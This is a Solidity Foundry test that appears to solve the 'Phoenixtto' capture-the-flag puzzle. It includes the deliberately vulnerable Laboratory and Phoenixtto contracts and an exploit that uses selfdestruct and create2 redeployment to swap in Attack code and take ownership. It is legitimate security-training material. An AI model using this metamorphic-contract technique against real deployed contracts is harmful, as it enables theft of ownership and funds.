// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {console} from "forge-std/console.sol";
import {BaseTest} from "../utils/BaseTest.sol";

contract PhoenixttoTest is BaseTest {
    Laboratory laboratory;
    Phoenixtto phoenixttoGI;
    Phoenixtto phoenixttoAddr;
    Attack attack;

    address attacker;

    constructor() {
        string[] memory labels = new string[](1);
        labels[0] = "Attacker";

        preSetup(1, labels);
    }

    function setUp() public override {
        super.setUp();
        attacker = users[0];

        laboratory = new Laboratory(attacker);
        laboratory.mergePhoenixDitto();
        phoenixttoGI = Phoenixtto(laboratory.getImplementation());
        phoenixttoAddr = Phoenixtto(laboratory.addr());
        vm.label(laboratory.getImplementation(), "PhoenixttoGI");
        vm.label(laboratory.addr(), "PhoenixttoAddr");
        assertEq(address(phoenixttoGI), laboratory.getImplementation());
        assertEq(address(phoenixttoAddr), laboratory.addr());
        vm.startPrank(attacker, attacker);
        string memory str = "1";
        phoenixttoAddr.capture(str);

        vm.stopPrank();
    }

    function test_Phoenixtto() public {
        runTest();
    }

    function exploit() internal override {
        vm.startPrank(attacker);
        string memory str = "1";

        console.logBytes((type(Attack).creationCode));
        laboratory.reBorn(type(Attack).creationCode);
        phoenixttoAddr.capture(str);
        vm.stopPrank();
    }

    function success() internal override {
        assertEq(Phoenixtto(address(laboratory.addr())).owner(), attacker);
    }
}

pragma solidity ^0.8.17;

contract Laboratory {
    address immutable PLAYER;
    address public getImplementation;
    address public addr;

    constructor(address _player) {
        PLAYER = _player;
    }

    function mergePhoenixDitto() public {
        reBorn(type(Phoenixtto).creationCode);
    }

    function reBorn(bytes memory _code) public {
        address x;
        assembly {
            x := create(0, add(0x20, _code), mload(_code))
        }
        getImplementation = x;

        _code = hex"5860208158601c335a63aaf10f428752fa158151803b80938091923cf3";
        assembly {
            x := create2(0, add(_code, 0x20), mload(_code), 0)
        }
        addr = x;
        Phoenixtto(x).reBorn();
    }

    function isCaught() external view returns (bool) {
        return Phoenixtto(addr).owner() == PLAYER;
    }
}

contract Phoenixtto {
    address public owner;
    bool private _isBorn;

    function reBorn() external {
        if (_isBorn) return;

        _isBorn = true;
        owner = address(this);
    }

    function capture(string memory _newOwner) external {
        if (!_isBorn || msg.sender != tx.origin) return;

        address newOwner = address(
            uint160(uint256(keccak256(abi.encodePacked(_newOwner))))
        );
        if (newOwner == msg.sender) {
            owner = newOwner;
        } else {
            selfdestruct(payable(msg.sender));
            _isBorn = false;
        }
    }
}

contract Attack {
    address public owner;

    function reBorn() external {}

    function capture(string memory _newOwner) external {
        owner = msg.sender;
    }
}
